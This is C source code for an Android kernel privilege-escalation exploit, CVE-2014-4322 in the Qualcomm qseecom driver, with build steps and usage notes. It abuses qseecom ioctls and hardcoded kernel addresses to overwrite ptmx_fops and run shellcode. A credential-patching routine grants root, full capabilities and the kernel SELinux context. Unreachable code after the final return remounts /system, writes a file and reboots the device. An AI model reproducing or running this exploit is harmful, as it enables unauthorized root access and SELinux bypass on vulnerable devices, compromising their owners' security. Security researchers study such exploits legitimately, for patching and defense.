/*
 *          CVE-2014-4322 exploit  for Nexus Android 4.4/5.0
 *
 *          author:  retme   retme7@gmail.com
 *          website: retme.net
 *
 *				 The exploit must be excuted as system privilege and  several specific  SELinux  context.
 *				 If exploit successed,you will gain root privilege and "kernel" SELinux  context
 *
 *          bug info:
 *          	https://www.codeaurora.org/projects/security-advisories/memory-corruption-qseecom-driver-cve-2014-4322
 *
 *				 how to build:
 *
			 				    create an  Android.mk as follow:

									include $(CLEAR_VARS)
									include $(CLEAR_VARS)
									LOCAL_SRC_FILES:= ./msm.c \
																				 ./shellcode.S

									LOCAL_MODULE:= exploit
									#LOCAL_C_INCLUDES += $(common_includes)
									LOCAL_CPPFLAGS += -DDEBUG
									LOCAL_CFLAGS += -DDEBUG
									LOCAL_LDLIBS += -L$(SYSROOT)/usr/lib -llog

									include $(BUILD_EXECUTABLE)
									include $(BUILD_EXECUTABLE)

								create Application.mk as follow:

									APP_ABI := armeabi
									APP_PLATFORM := android-8
									APP_PIE:= true

								use  ndk-build to build the project

				usage:

							 run  exploit as  system privilege,with SELinux context  such as "keystore","vold","drmserver","mediaserver","surfaceflinger"
 *
 *							 If exploit successed,you will gain root privilege and "kernel" SELinux  context
 *
 *
 *                       */
//=========================================msm.c=============================================
#include <string.h>
#include <jni.h>
#include <android/log.h>
//#include <pthread.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
//#include <asm/ptrace.h>
//#include <asm/user.h>
//#include <asm/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
//#include <linux/elf.h>
//#include <linux/reboot.h>
#include <errno.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
//#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
//#include <linux/ptrace.h>
//#include <linux/prctl.h>
//#include <sys/system_properties.h>
#include <errno.h>
//#include <termios.h>
//#include <sys/syscall.h>
//#include <sys/socket.h>
//#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
//#include <netinet/in.h>
#include <errno.h>
#include <linux/msm_ion.h>

#include "../kernel.h"
#include "qseecom.h"



// 14.3.1.0
//#define PRINTK 0xc08623b0
//#define PTMX_FOPS 0xc0fa7458

// 14.4.5.2
#define PRINTK 0xc0919d80
#define PTMX_FOPS 0xc11bf690



#define PTMX_DEVICE "/dev/ptmx"
#define array_len(a) (sizeof(a) / sizeof(*a))




int MyCommitCred(int ruid, int rgid, signed int a3, int isSelinux);




int kmemcmp(char *a1, char *a2, int len)
{
  int v3; // r3@2
  int v4; // r4@3
  int v5; // r5@3
  int result; // r0@4

  if ( len )
  {
    v3 = 0;
    while ( 1 )
    {
      v4 = a1[v3];
      v5 = a2[v3];
      if ( v4 != v5 )
    break;
      if ( a1[v3] )
      {
    ++v3;
    if ( len != v3 )
      continue;
      }
      goto LABEL_7;
    }
    result = v4 - v5;
  }
  else
  {
LABEL_7:
    result = 0;
  }
  return result;
}

int g_pid = 0;
int g_tgid = 0;



int open_ion(){
	int fd = open("/dev/ion",O_RDONLY);
    if (fd<0){
    	perror("open");
    }
    printf("ion fd %d\n",fd);
    return fd;
}


// http://lwn.net/Articles/480055/

/*
 * struct ion_allocation_data {
	size_t len;
	size_t align;
	unsigned int heap_mask;
	unsigned int flags;
	struct ion_handle *handle;
};
 *
 *
 * */

int alloc_ion_memory(int client_fd, int size, ion_user_handle_t *pphandle){
	int ret = -1;

	struct ion_allocation_data data;
    memset(&data, 0, sizeof(data));

    // ION_FLAG_CACHED
	data.len = size;
	data.align = size;
	//data.flags = ION_HEAP_TYPE_CARVEOUT;
    data.flags = 0;
    data.heap_mask = ION_HEAP(ION_QSECOM_HEAP_ID);
	//data.heap_mask = ION_HEAP_TYPE_CARVEOUT;
	//data.handle = handle;

	ret = ioctl(client_fd, ION_IOC_ALLOC, &data);
	if (ret < 0){
		perror("ioctl(ION_IOC_ALLOC)");
        return -1;
	}
    
	*pphandle = data.handle;
	return ret;

}
/*
    struct ion_fd_data {
    struct ion_handle *handle;
    int fd;
   }
   */
int share_ion_memory(int client_fd, ion_user_handle_t handle){
	struct ion_fd_data data;
	data.handle = handle;
	data.fd = -1;

	int ret = ioctl(client_fd, ION_IOC_SHARE, &data);
    if (ret < 0) {
        perror("ioctl(ION_IOC_SHARE)");
        return -1;
    }

	return data.fd;
}

void* fd_to_mmap(int fd, int size)
{
    void *seg_addr = mmap(0, size,
        PROT_READ | PROT_WRITE,
        MAP_SHARED,
        fd, 0);

    if (seg_addr == MAP_FAILED) {
    	perror("fd_to_map");
    }

	return seg_addr;
}


int obtain_dma_buf_fd(int size)
{
    int fd_device = open_ion();

    ion_user_handle_t handle;
    int ret = alloc_ion_memory(fd_device, size, &handle);
    if (ret < 0) {
        return -1;
    }

    int fd = share_ion_memory(fd_device, handle);
    if (fd < 0){
        return -1;
    }
    
    printf("Got dma fd %d\n", fd);
    
    void *addr = fd_to_mmap(fd, size);
    if (addr == MAP_FAILED) {
        return -1;
    }
    
    return fd;
}






//c0a0113c T printk
void sayhello(){
	fnPrintk printk = (fnPrintk)PRINTK;
	printk("hell0 shellocde");
	return;
}

void shell_code2();

int
run_obtain_root_privilege()
{
    int fd;
    int ret;

    printf("Opening PTMX_DEVICE\n");
    fd = open(PTMX_DEVICE, O_WRONLY);
    if (fd < 0) {
        perror("open(PTMX_DEVICE)");
        return -1;
    }

    printf("Triggering sc\n");
    ret = fsync(fd);
    close(fd);
    return ret;
}

void cwait() {
    printf("waiting\n");
    getchar();
}

int main(int argc, char *argv[])
{
    int ret;
    int i;
    
    printf("brk %p\n", sbrk(0));
    //printf("brk %p\n", sbrk(4096));
    //printf("brk %p\n", sbrk(4096));
    
    printf("mypid %d\n", getpid());
    
    
    char *target = 0xaf000000;
    unsigned int target_len = 0xb0000000 - (unsigned int)target;
    
    if (1) {
        target = mmap(target, target_len, //- 4096, //0xff000000 - 0xf0000000,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS,
            -1, 0);
            
        printf("target %p\n", target);
        memset(target, 0xff, target_len);
        cwait();
        //return 0;
    }
   

    int abuseBuff_sz = 4096;
    char *abuseBuff = malloc(abuseBuff_sz);
    if (!abuseBuff) {
        printf("abuseBuff malloc failed\n");
        return -1;
    }

    char *abuse_addr = (char*)PTMX_FOPS + 14*4;
    unsigned int abuse_offset = abuse_addr - abuseBuff;
    printf("abuseBuff at\t%p\n", abuseBuff);
    printf("abuseBuff end\t%p\n", abuseBuff + abuseBuff_sz);
    //printf("offset to PTMX_FOPS 0x%x\n", (int)(PTMX_FOPS + 14*4) - (int)abuseBuff);
    printf("offset to PTMX_FOPS 0x%x\n", abuse_offset);
    //return 0;
    
    memset(abuseBuff, 0, abuseBuff_sz);
    
    int *intArr = (int*)abuseBuff;
    for (i=0; i < 24; i++){
        intArr[i] = 0x1;
    }
    
    
    //abuseBuff_sz *= 50000;
    //abuseBuff_sz = abuse_offset + 64;
    //abuseBuff_sz = 0xc0000000 - (unsigned int)abuseBuff - 4096*100;
    
    //abuseBuff_sz = 0xbf000428 - (unsigned int)abuseBuff - 4096;
    //abuseBuff_sz *= 200;
    
    char *contBuff;
    
    for (i = 0; i < 0; ++i) {
        contBuff = calloc(1, abuseBuff_sz);
        if (!contBuff) {
            printf("contBuff malloc failed\n");
            return -1;
        }
        
        printf("contBuff at %p\n", contBuff);
        printf("brk %p\n", sbrk(0));
        //printf("abuseBuff to contBuff 0x%x\n", contBuff - abuseBuff);
    
    }
    
    
    
    int fd = open("/dev/qseecom", 0);
    if (fd < 0){
        perror("open(qseecom)");
        return -1;
    }
    
    printf("qseecom fd %d\n", fd);
    

    //prctl(PR_SET_NAME, "GodFather", 0, 0, 0);

    // if(0==fork()){

    g_pid = getpid();
    g_tgid = g_pid;
    prctl(PR_SET_NAME, "ihoo.darkytools", 0, 0, 0);

    //QSEECOM_IOCTL_SET_MEM_PARAM_REQ
    int dma_fd = obtain_dma_buf_fd(8192);
    if (dma_fd < 0) {
        return -1;
    }
    
    struct qseecom_set_sb_mem_param_req req;
    memset(&req, 0, sizeof(req));
    
    req.ifd_data_fd = dma_fd;
    //req.virt_sb_base = abuseBuff;
    //req.sb_len = abuseBuff_sz; //8192;
    
    req.virt_sb_base = 0x00001000;
    req.sb_len = 0xbf000000 - req.virt_sb_base;
    
    
    if (0){
        cwait();
    }
    
    printf("QSEECOM_IOCTL_SET_MEM_PARAM_REQ start\n");
    
    for (;;) {
        ret = ioctl(fd, QSEECOM_IOCTL_SET_MEM_PARAM_REQ, &req);
        printf("ioctl return 0x%x\n", ret);
        if (ret < 0) {
            perror("ioctl");
            //printf("buf end %p\n", abuseBuff + req.sb_len);
            return -1;
        }
        break;
        //req.sb_len += 1; //4096;
    }
    
    //return 0;
    
    struct qseecom_send_modfd_cmd_req ioctlBuff;
    
    printf("Searching for apps\n");
    
    struct qseecom_qseos_app_load_query que_app;
    memset(&que_app, 0, sizeof(que_app));
    
    const char * const app_names[] = {
        "playread",
        "tzwidevine",
        "keymaster",
        "tzsuntory",
        "venus",
        "securemm",
        "SsmApp",
        "adsp",
        
        // /firmware/image
        "tzskp",
        "isdbtmm",
        "modem",
        "cmnlib",
        "mba",
        "widevine",
        "playread",
        "dxhdcp2"
    };
    
    for (i = 0; i < array_len(app_names); ++i) {
        strcpy(que_app.app_name, app_names[i]);
        ret = ioctl(fd, QSEECOM_IOCTL_APP_LOADED_QUERY_REQ, &que_app);
        printf("%s: %d, app_id: %d\n", que_app.app_name, ret, que_app.app_id);
        if (ret == -1)
            goto query_ok;
    }

    printf("No apps found, stopping here\n");
    //return -1;
	

query_ok:
    
    
    
    
    
    
    
    
    
    
    //QSEECOM_IOCTL_SEND_MODFD_CMD_REQ
    
    memset(&ioctlBuff, 0, sizeof(ioctlBuff));
    
    //ioctlBuff.cmd_req_buf = abuseBuff;
    //ioctlBuff.cmd_req_len = abuseBuff_sz; //400;
    //ioctlBuff.resp_buf = abuseBuff;
    //ioctlBuff.resp_len = abuseBuff_sz; //400;
    
    ioctlBuff.cmd_req_buf = req.virt_sb_base + req.sb_len - 4;
    ioctlBuff.cmd_req_len = req.sb_len; //400;
    
    ioctlBuff.resp_buf = ioctlBuff.cmd_req_buf;
    ioctlBuff.resp_len = ioctlBuff.cmd_req_len;
    
    //for (i = 0; i < 4; i++){
    //    ioctlBuff.ifd_data[i].fd = 0;
    //    ioctlBuff.ifd_data[i].cmd_buf_offset = 0;
    //}
    ioctlBuff.ifd_data[0].fd = req.ifd_data_fd;
    ioctlBuff.ifd_data[0].cmd_buf_offset =   0;//(int)(0xc03f0ab4 + 8) - (int)abuseBuff;
    
    ioctlBuff.ifd_data[1].fd = 1000;




    printf("QSEECOM_IOCTL_SEND_MODFD_CMD_REQ start\n");
    //printf("QSEECOM_IOCTL_SEND_MODFD_CMD_REQ before %x %x\n", intArr[0], intArr[1]);
    
    ret = ioctl(fd, QSEECOM_IOCTL_SEND_MODFD_CMD_REQ, &ioctlBuff);
    printf("ioctl return 0x%x\n", ret);
    
    //printf("QSEECOM_IOCTL_SEND_MODFD_CMD_REQ gave us %p %p\n", intArr[0], intArr[1]);
    
    if (ret < 0) {
        perror("ioctl");
        //return -1;
    }


    printf("Scanning target\n");
    unsigned int *hit_addr = NULL;
    for (i = 0; i < target_len;) {
        if (target[i] != 0xff) {
            if (hit_addr) {
                printf("second hit\n");
                return -1;
            }
            hit_addr = &target[i];
            printf("%p: %p\n", hit_addr, *hit_addr);
            i += 4;
        } else {
            ++i;
        }
    }
    
    if (!hit_addr) {
        printf("no hit\n");
        return -1;
    }
    

    //cwait();
    //return 0;

    //*(int*)intArr[0] = 0x0;
    //void* addr = mmap(intArr[0], 4096,
    void* addr = mmap(*hit_addr, 4096,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS,
        -1, 0);
        
    printf("mmap return %p\n",addr);
    if (addr == MAP_FAILED) {
        perror("mmap");
        return -1;
    }
    
    //return 0;

    printf("Prepping sc\n");

    //*(int*)addr =  0xE3500000;
    //*((int*)((int)addr+4)) = 0xe1a0f00e;
    memcpy(addr, (char*)shell_code2, 64);

    int *arr = (int*)addr;
    for(i=0; i < 10; i++){
        if(arr[i] == 0xeeeeeeee) {
            //arr[i] = (int)MyCommitCred;
        arr[i] = (int)sayhello;
        }
        printf("%x\n",arr[i]);
    }

    //c1334e00 b ptmx_fops
    //ioctlBuff.ifd_data[0].cmd_buf_offset =   (int)(PTMX_FOPS + 14*4) - (int)abuseBuff;
    ioctlBuff.ifd_data[0].cmd_buf_offset =   (int)(PTMX_FOPS + 14*4) - (int)hit_addr;
    //ioctlBuff.ifd_data[0].cmd_buf_offset = 0;


    printf("QSEECOM_IOCTL_SEND_MODFD_CMD_REQ start\n");
    ret = ioctl(fd, QSEECOM_IOCTL_SEND_MODFD_CMD_REQ, &ioctlBuff);
    printf("ioctl return 0x%x\n", ret);
    //printf("QSEECOM_IOCTL_SEND_MODFD_CMD_REQ gave us %p %p\n",intArr[0],intArr[1]);
    if (ret < 0) {
        perror("ioctl");
        //return -1;
    }
    


    run_obtain_root_privilege();
    
    printf("Bye\n");
    
    return 0;
    
    
    system("mount -o rw,remount /system");
    system("echo root > /system/file.txt");
    system("reboot");
    //char * argv1[]={"sh",(char *)0};
       //int result =  execv("/system/bin/sh", argv1);
    //if(result){
     //           perror("execv");
    //}

    return 0;


}





int MyCommitCred(int ruid, int rgid, signed int a3, int isSelinux)
{

    int v38; // [sp+0h] [bp-60h]@1
    int addrBase;
    char szName[16] = "ihoo.darkytools";
    int offset;
    mycred *my_cred;
    mycred *my_real_cred;
    struct task_security_struct * tsec;
    int ret = -1;

    int searchLenth;

    isSelinux = 1;
    //return 0;
    addrBase = *(int*)(((int)(&v38) & 0xFFFFE000) + 0xC);
    //return addrBase;
    if ( addrBase > 0xBFFFFFFF )
    {

      offset = 0;
      while ( 1 )
      {
        addrBase += 4;
        if ( !kmemcmp(addrBase, szName, 16) )
          break;
        ++offset;
        if ( offset == 0x600 )
        {
          return 18;
        }
      }
    }
    else
        return 17;

    my_cred = *(int*)(addrBase -8);
    my_real_cred = *(int*)(addrBase -8 - 4);


    searchLenth = 0;
    while(searchLenth<0x20){


            if(!my_cred || !my_real_cred
                    || my_cred<0xBFFFFFFF || my_real_cred<0xBFFFFFFF
                       ){
                    //2.6?

                    addrBase-=4;


                    my_cred = *(int*)(addrBase-8 );
                    my_real_cred = *(int*)(addrBase -8-4);

            }
            else
                break;

            searchLenth++;
    }

    if(searchLenth == 0x20)
        return 0X20;
        // fuck!! where is my cred???


    my_cred->uid = 0;
    my_cred->gid = 0;
    my_cred->suid = 0;
    my_cred->sgid = 0;
    my_cred->egid = 0;
    my_cred->euid = 0;
    my_cred->fsgid = 0;
    my_cred->fsuid = 0;
    my_cred->securebits=0;
    my_cred->cap_bset.cap[0] = -1;
    my_cred->cap_bset.cap[1] = -1;
    my_cred->cap_inheritable.cap[0] = -1;
    my_cred->cap_inheritable.cap[1] = -1;
    my_cred->cap_permitted.cap[0] = -1;
    my_cred->cap_permitted.cap[1] = -1;
    my_cred->cap_effective.cap[0] = -1;
    my_cred->cap_effective.cap[1] = -1;

    my_real_cred->uid = 0;
    my_real_cred->gid = 0;
    my_real_cred->suid = 0;
    my_real_cred->sgid = 0;
    my_real_cred->egid = 0;
    my_real_cred->euid = 0;
    my_real_cred->fsgid = 0;
    my_real_cred->fsuid = 0;
    my_real_cred->securebits=0;
    my_real_cred->cap_bset.cap[0] = -1;
    my_real_cred->cap_bset.cap[1] = -1;
    my_real_cred->cap_inheritable.cap[0] = -1;
    my_real_cred->cap_inheritable.cap[1] = -1;
    my_real_cred->cap_permitted.cap[0] = -1;
    my_real_cred->cap_permitted.cap[1] = -1;
    my_real_cred->cap_effective.cap[0] = -1;
    my_real_cred->cap_effective.cap[1] = -1;


    if(isSelinux){

            tsec = my_cred->security;

            if(tsec && tsec > 0xBFFFFFFF){
                    tsec->sid = 1;
                    tsec->exec_sid = 1;

                    ret = 15;
            }
            else {
                    tsec = (struct task_security_struct*)(*(int*)(0x10 +  (int)&my_cred->security));

                    if(tsec && tsec > 0xBFFFFFFF){
                                        tsec->sid = 1;
                                        tsec->exec_sid = 1;

                                        ret = 15;
                                }
            }


            tsec = my_real_cred->security;

            if(tsec && tsec > 0xBFFFFFFF){
                    tsec->sid = 1;
                    tsec->exec_sid = 1;

                    ret = 15;
            }else {
                    tsec = (struct task_security_struct*)(*(int*)(0x10 +  (int)&my_real_cred->security));

                    if(tsec && tsec > 0xBFFFFFFF){
                                        tsec->sid = 1;
                                        tsec->exec_sid = 1;

                                        ret = 15;
                                }
            }



    }
    else{
            ret = 16;
    }
    //printk("return %d",ret);
    return ret;
}
//=========================================msm.c   end=============================================
